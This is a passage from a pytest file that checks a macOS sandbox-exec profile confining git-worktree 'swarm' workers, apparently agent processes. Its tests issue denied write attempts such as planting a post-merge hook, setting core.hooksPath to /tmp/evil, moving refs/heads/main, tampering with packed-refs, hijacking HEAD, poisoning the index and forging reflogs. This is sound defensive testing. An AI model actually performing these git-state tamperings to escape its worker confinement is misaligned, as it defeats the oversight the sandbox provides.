    workspace = tmp_path / "wt"
    workspace.mkdir()
    profile = sandbox.build_profile(str(workspace), [str(git_dir)])

    def sh(command: str) -> None:
        subprocess.run(
            ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", command],
            capture_output=True,
            text=True,
            timeout=15,
        )

    real = Path(os.path.realpath(str(git_dir)))
    # Hook planting is physically denied.
    sh(f"echo evil > {real / 'hooks' / 'post-merge'}")
    assert not (real / "hooks" / "post-merge").exists()
    # Config rewrite (core.hooksPath escape) is physically denied.
    sh(f"echo '[core]hooksPath=/tmp/evil' >> {real / 'config'}")
    assert "hooksPath" not in (real / "config").read_text()
    # Object writes (what a worker `git commit` actually needs) still work.
    sh(f"echo obj > {real / 'objects' / 'probe'}")
    assert (real / "objects" / "probe").read_text() == "obj\n"
    # M3: refs/heads is DENIED without a granted run namespace — a worker
    # profile lacking its namespace root cannot write any branch ref.
    sh(f"echo ref > {real / 'refs' / 'heads' / 'probe'}")
    assert not (real / "refs" / "heads" / "probe").exists()
    # And the worktree workspace itself is writable.
    sh(f"echo ok > {Path(os.path.realpath(str(workspace))) / 'work.txt'}")
    assert (Path(os.path.realpath(str(workspace))) / "work.txt").read_text() == "ok\n"


def test_git_dir_ref_denies_and_namespace_allow_in_profile(tmp_path: Path) -> None:
    """M3 profile shape: a granted git-dir root denies the refs/heads subtree
    + the packed-refs literal; a granted root INSIDE refs/heads (the run's
    swarm/<run_id> namespace) is re-allowed AFTER the denies (SBPL last
    match wins)."""
    git_dir = _fake_git_common_dir(tmp_path)
    (git_dir / "refs" / "heads" / "swarm" / "swr_run1").mkdir(parents=True)
    workspace = tmp_path / "wt"
    workspace.mkdir()
    namespace = git_dir / "refs" / "heads" / "swarm" / "swr_run1"

    literals, subpaths = sandbox.git_dir_ref_write_deny_targets([str(git_dir)])
    assert os.path.realpath(str(git_dir / "packed-refs")) in literals
    assert os.path.realpath(str(git_dir / "refs" / "heads")) in subpaths
    # The namespace allow is derived from a granted root INSIDE refs/heads.
    allows = sandbox.git_dir_ref_write_allow_subpaths([str(git_dir), str(namespace)])
    assert allows == [os.path.realpath(str(namespace))]
    # ...and never from unrelated roots.
    assert sandbox.git_dir_ref_write_allow_subpaths([str(git_dir), str(workspace)]) == []

    profile = sandbox.build_profile(str(workspace), [str(git_dir), str(namespace)])
    heads_deny = (
        f'(deny file-write* (subpath "{os.path.realpath(str(git_dir / "refs" / "heads"))}"))'
    )
    packed_deny = f'(deny file-write* (literal "{os.path.realpath(str(git_dir / "packed-refs"))}"))'
    ns_allow = f'(allow file-write* (subpath "{os.path.realpath(str(namespace))}"))'
    assert heads_deny in profile
    assert packed_deny in profile
    assert ns_allow in profile
    # Order: allow AFTER both denies, denies AFTER the main write-allow block.
    assert profile.index(ns_allow) > profile.index(heads_deny)
    assert profile.index(ns_allow) > profile.index(packed_deny)
    assert profile.index(heads_deny) > profile.index("(allow file-write*")
    # A plain (non-git) workspace root gains NO ref rules.
    plain = sandbox.build_profile(str(workspace))
    assert "refs/heads" not in plain


def test_worker_profile_confines_ref_writes_to_run_namespace(tmp_path: Path) -> None:
    """M3 live sandbox-exec proof: with the git common dir + the run's
    refs/heads/swarm/<run_id> namespace granted, a worker can update its OWN
    branch ref (and its .lock beside it) but CANNOT write refs/heads/main or
    packed-refs. Residual (accepted, documented): sibling refs of the SAME
    run inside the namespace stay writable — neutralized by SHA-merge."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec not available/proven on this host")
    import subprocess

    git_dir = _fake_git_common_dir(tmp_path)
    (git_dir / "refs" / "heads" / "main").write_text("0" * 40 + "\n")
    (git_dir / "packed-refs").write_text("# pack-refs with: peeled fully-peeled\n")
    namespace = git_dir / "refs" / "heads" / "swarm" / "swr_run1"
    namespace.mkdir(parents=True)
    workspace = tmp_path / "wt"
    workspace.mkdir()
    profile = sandbox.build_profile(str(workspace), [str(git_dir), str(namespace)])

    def sh(command: str) -> None:
        subprocess.run(
            ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", command],
            capture_output=True,
            text=True,
            timeout=15,
        )

    real = Path(os.path.realpath(str(git_dir)))
    real_ns = Path(os.path.realpath(str(namespace)))
    # The worker CAN update its own branch ref + take the ref lock beside it.
    sh(f"echo {'1' * 40} > {real_ns / 'taskA'}")
    assert (real_ns / "taskA").read_text().strip() == "1" * 40
    sh(f"echo lock > {real_ns / 'taskA.lock'}")
    assert (real_ns / "taskA.lock").exists()
    # It CANNOT move main.
    sh(f"echo {'2' * 40} > {real / 'refs' / 'heads' / 'main'}")
    assert (real / "refs" / "heads" / "main").read_text() == "0" * 40 + "\n"
    # It CANNOT rewrite/append packed-refs (wholesale ref tampering).
    sh(f"echo tamper >> {real / 'packed-refs'}")
    assert "tamper" not in (real / "packed-refs").read_text()
    # It CANNOT create refs for another run outside its namespace.
    sh(f"mkdir -p {real / 'refs' / 'heads' / 'swarm' / 'swr_other'}")
    assert not (real / "refs" / "heads" / "swarm" / "swr_other").exists()
    # Object writes still work (worker commits need them).
    sh(f"echo obj > {real / 'objects' / 'probe2'}")
    assert (real / "objects" / "probe2").read_text() == "obj\n"


def test_worker_profile_denies_main_git_state_allows_own_worktree_gitdir(
    tmp_path: Path,
) -> None:
    """R1 live sandbox-exec proof: with the git common dir + run namespace +
    the worker's OWN linked-worktree gitdir granted, the worker CANNOT touch
    the MAIN workspace's git state (HEAD hijack, index poisoning, reflog
    forgery, sibling-gitdir hijack) but CAN write its own gitdir's
    HEAD/index and its branch's reflog twin."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec not available/proven on this host")
    import subprocess

    git_dir = _fake_git_common_dir(tmp_path)
    (git_dir / "index").write_text("INDEX")
    (git_dir / "logs" / "refs" / "heads" / "swarm" / "swr_run1").mkdir(parents=True)
    (git_dir / "logs" / "HEAD").write_text("main reflog\n")
    own = git_dir / "worktrees" / "taskA"
    own.mkdir(parents=True)
    (own / "HEAD").write_text("ref: refs/heads/swarm/swr_run1/taskA\n")
    sibling = git_dir / "worktrees" / "taskB"
    sibling.mkdir(parents=True)
    (sibling / "HEAD").write_text("ref: refs/heads/swarm/swr_run1/taskB\n")
    namespace = git_dir / "refs" / "heads" / "swarm" / "swr_run1"
    namespace.mkdir(parents=True)
    workspace = tmp_path / "wt"
    workspace.mkdir()

    # Profile-shape assertions (helpers).
    literals, subpaths = sandbox.git_dir_state_write_deny_targets([str(git_dir)])
    assert os.path.realpath(str(git_dir / "HEAD")) in literals
    assert os.path.realpath(str(git_dir / "index")) in literals
    assert os.path.realpath(str(git_dir / "logs")) in subpaths
    assert os.path.realpath(str(git_dir / "worktrees")) in subpaths
    own_allows = sandbox.git_dir_worktree_write_allow_subpaths([str(git_dir), str(own)])
    assert own_allows == [os.path.realpath(str(own))]
    reflog_allows = sandbox.git_dir_reflog_write_allow_subpaths([str(git_dir), str(namespace)])
    assert reflog_allows == [
        os.path.realpath(str(git_dir))
        + "/logs/"
        + os.path.relpath(os.path.realpath(str(namespace)), os.path.realpath(str(git_dir)))
    ]

    profile = sandbox.build_profile(str(workspace), [str(git_dir), str(namespace), str(own)])

    def sh(command: str) -> None:
        subprocess.run(
            ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", command],
            capture_output=True,
            text=True,
            timeout=15,
        )

    real = Path(os.path.realpath(str(git_dir)))
    # Main HEAD hijack physically denied.
    sh(f"echo 'ref: refs/heads/swarm/swr_run1/taskA' > {real / 'HEAD'}")
    assert (real / "HEAD").read_text() == "ref: refs/heads/main\n"
    # Main index poisoning denied.
    sh(f"echo poison > {real / 'index'}")
    assert (real / "index").read_text() == "INDEX"
    sh(f"echo lock > {real / 'index.lock'}")
    assert not (real / "index.lock").exists()
    # Main reflog forgery denied.
    sh(f"echo forged >> {real / 'logs' / 'HEAD'}")
    assert "forged" not in (real / "logs" / "HEAD").read_text()
    # Sibling worktree gitdir hijack denied.
    sh(f"echo 'ref: refs/heads/main' > {real / 'worktrees' / 'taskB' / 'HEAD'}")
    assert (real / "worktrees" / "taskB" / "HEAD").read_text() == (
        "ref: refs/heads/swarm/swr_run1/taskB\n"
    )
    # Own gitdir HEAD/index writable (every git op in the worktree needs them).
    sh(f"echo 'ref: refs/heads/swarm/swr_run1/taskA' > {real / 'worktrees' / 'taskA' / 'HEAD'}")
    assert (real / "worktrees" / "taskA" / "HEAD").exists()
    sh(f"echo idx > {real / 'worktrees' / 'taskA' / 'index'}")
    assert (real / "worktrees" / "taskA" / "index").read_text() == "idx\n"
    # Branch reflog twin writable (worker commits append it).
    reflog_dir = real / "logs" / "refs" / "heads" / "swarm" / "swr_run1"
    sh(f"echo entry >> {reflog_dir / 'taskA'}")
    assert (reflog_dir / "taskA").read_text() == "entry\n"
